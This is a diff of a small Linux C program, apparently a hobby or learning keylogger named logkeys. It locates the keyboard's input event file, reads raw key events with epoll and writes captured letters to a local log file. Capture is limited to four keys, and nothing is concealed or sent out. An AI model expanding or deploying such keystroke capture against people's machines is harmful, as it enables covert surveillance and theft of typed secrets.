@@ -10,152 +10,151 @@
 
 #include "logkeys.h"
 
-static int get_kbd_eventid();
-static void log_keys(int epfd, int kbd_fd, FILE *logfp);
-
-int main(int argc, char const *argv[]) {
-
-    int kbd_event_id = get_kbd_eventid();
-    char kbd_event_file[64];
-    memset(kbd_event_file, 0, sizeof(kbd_event_file));
-    sprintf(kbd_event_file, "%s/event%d", EVENT_PATH_PREFIX, kbd_event_id);
-
-    int kbd_fd = open(kbd_event_file, O_RDONLY);
-    if (kbd_fd < 0) {
-        perror("open kbd_event_file failed");
-        return -1;
+static void tolowers(char *s) {
+    for (int i = 0; s[i] != 0; ++i) {
+        s[i] = tolower(s[i]);
     }
-
-    int epfd = epoll_create1(0);
-    if (epfd < 0) {
-        perror("epoll_create1 failed");
-        return -1;
-    }
-
-    struct epoll_event ev1 = {.data.fd = kbd_fd, .events = EPOLLIN};
-    int err = epoll_ctl(epfd, EPOLL_CTL_ADD, kbd_fd, &ev1);
-    if (err == -1) {
-        perror("epoll_ctl failed");
-        return -1;
-    }
-
-    FILE *logfp = fopen("keys.log", "w");
-    log_keys(epfd, kbd_fd, logfp);
-    fclose(logfp);
-
-    close(kbd_fd);
-    close(epfd);
-    return 0;
 }
 
-static int get_kbd_eventid() {
-    FILE *devfp = fopen("/proc/bus/input/devices", "r");
+static int kbd_event_id() {
+
+    FILE *devfp = fopen(DEVICE_PATH, "r");
     if (devfp == NULL) {
+        perror("failed to open devices file");
         return -1;
     }
+
+    int id = -1;
 
     int found = 0;
+    char *event = NULL;
+
     char *line = NULL;
     size_t n = 0;
-    char *event = NULL;
+
     while (getline(&line, &n, devfp) != -1) {
-        if (!found && strstr(line, "keyboard") != NULL) {
+        tolowers(line);
+        if (strstr(line, "keyboard") != NULL) {
             found = 1;
-        } else if (found) {
-            event = strstr(line, "event");
+            continue;
         }
-        free(line);
-        line = NULL;
-        n = 0;
-        if (event)
+        if (found && (event = strstr(line, "event")) != NULL) {
+            id = event[5] - '0';
             break;
+        }
+    }
+    if (line != NULL)
+        free(line);
+
+    return id;
+}
+
+int get_key_of(struct input_event *input) {
+    if (input->type != EV_KEY || input->value != 1)
+        return -1;
+
+    switch (input->code) {
+    case KEY_Q:
+        return 'q';
+    case KEY_W:
+        return 'w';
+    case KEY_E:
+        return 'e';
+    case KEY_R:
+        return 'r';
     }
 
-    fclose(devfp);
-    if (event == NULL) {
+    return -1;
+}
+
+int open_kbd_event_file() {
+    int eventid = kbd_event_id();
+    if (eventid == -1) {
+        printf("failed to get keyboard event id\n");
         return -1;
     }
 
-    return event[5] - '0';
+    char eventfname[64];
+    memset(eventfname, 0, sizeof(eventfname));
+
+    sprintf(eventfname, "%s/event%d", EVENT_PATH_PREFIX, eventid);
+    printf("%s\n", eventfname);
+    int fd = open(eventfname, O_RDONLY);
+    return fd;
 }
 
-static void log_keys(int epfd, int kbd_fd, FILE *logfp) {
-    char buf[64];
-    char ch = 0;
-    int i = 0;
+void logkeys(int kbd_ev_fd, char *logfname) {
+    // open log file
+    FILE *logfp = fopen(logfname, "w");
+    if (logfp == NULL) {
+        perror("failed to open log file");
+        return;
+    }
 
-    int hold_shift = 0;
-    int quit = 0;
+    int index = 0;
+    char key_buf[64];
+    memset(key_buf, 0, 64);
 
-    struct input_event input_event;
-    struct epoll_event ev;
-    ssize_t len = 0;
+    // wait for key strokes
+    int epfd = epoll_create1(0);
+    if (epfd == -1) {
+        perror("failed to epoll_create1");
+        return;
+    }
 
-    memset(buf, 0, 64);
+    struct epoll_event event = {.data.fd = kbd_ev_fd, .events = EPOLLIN};
+    epoll_ctl(epfd, EPOLL_CTL_ADD, kbd_ev_fd, &event);
 
-    while (!quit) {
-        int err = epoll_wait(epfd, &ev, 1, -1);
+    while (1) {
+        int err = epoll_wait(epfd, &event, 1, -1);
         if (err == -1) {
-            perror("epoll_wait failed");
-            return;
+            perror("failed to epoll_wait");
+            goto clean;
         }
 
-        if (ev.data.fd != kbd_fd) {
-            perror("epoll_wait failed, not kbd_fd");
-            return;
+        struct input_event input;
+        if (read(kbd_ev_fd, &input, sizeof(input)) != sizeof(input)) {
+            perror("failed to read keyboard event file");
+            goto clean;
         }
 
-        len = read(kbd_fd, &input_event, sizeof(input_event));
-        if (len != sizeof(input_event)) {
-            perror("read failed");
-            return;
+        int key = get_key_of(&input);
+
+        if (isalnum(key)) {
+            key_buf[index] = key;
+            index += 1;
+        }
+        
+        if (key == 'q') {
+            fprintf(logfp, "%s", key_buf);
+            fflush(logfp);
+            break;
         }
 
-        if (input_event.type != EV_KEY)
-            continue;
-
-        if (input_event.code == KEY_LEFTSHIFT ||
-            input_event.code == KEY_RIGHTSHIFT) {
-            if (input_event.value == 2)
-                hold_shift = 1;
-            else
-                hold_shift = 0;
-            continue;
-        }
-
-        if (input_event.value == 1) {
-            switch (input_event.code) {
-            case KEY_Q:
-                ch = 'q';
-                break;
-            case KEY_W:
-                ch = 'w';
-                break;
-            case KEY_E:
-                ch = 'e';
-                break;
-            case KEY_R:
-                ch = 'r';
-                break;
-            case KEY_ESC:
-                quit = 1;
-                break;
-            }
-            if (hold_shift && isalnum(ch))
-                ch = toupper(ch);
-
-            if (ch == 0)
-                continue;
-            buf[i] = ch;
-            printf("%s\n", buf);
-            if (ch == '\n' || i == 63 || quit) {
-                fprintf(logfp, "%s", buf);
-                memset(buf, 0, 64);
-                i = 0;
-            }
-            i += 1;
+        if (index == 63) {
+            key_buf[index] = 0;
+            fprintf(logfp, "%s", key_buf);
+            fflush(logfp);
+            memset(key_buf, 0, 64);
+            index = 0;
         }
     }
 
-    fflush(logfp);
+clean:
+    fclose(logfp);
+    close(kbd_ev_fd);
+    close(epfd);
+}
+
+int main(int argc, char **argv) {
+
+    char *logfile = "keys.log";
+    if (argc >= 2) {
+        logfile = argv[1];
+    }
+
+    int fd = open_kbd_event_file();
+    logkeys(fd, logfile);
+
+    return 0;
 }
